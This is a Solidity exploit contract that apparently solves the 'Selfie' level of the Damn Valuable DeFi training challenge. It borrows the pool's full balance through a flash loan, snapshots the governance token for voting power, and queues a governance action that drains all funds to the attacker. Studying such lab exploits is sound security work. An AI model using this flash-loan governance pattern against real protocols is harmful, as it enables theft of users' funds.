// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../selfie/SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieAttack {
    SelfiePool immutable pool;
    DamnValuableTokenSnapshot immutable governanceToken;
    address immutable owner;

    constructor(address _pool, address _governanceToken) {
        pool = SelfiePool(_pool);
        governanceToken = DamnValuableTokenSnapshot(_governanceToken);
        owner = msg.sender;
    }

    function attack() external {
        uint256 amount = pool.token().balanceOf(address(pool));
        pool.flashLoan(amount);
    }

    function receiveTokens(address token, uint256 amount) external {
        governanceToken.snapshot();
        pool.governance().queueAction(
            address(pool),
            abi.encodeWithSignature("drainAllFunds(address)", owner),
            0
        );
        governanceToken.transfer(address(pool), amount);
    }
}
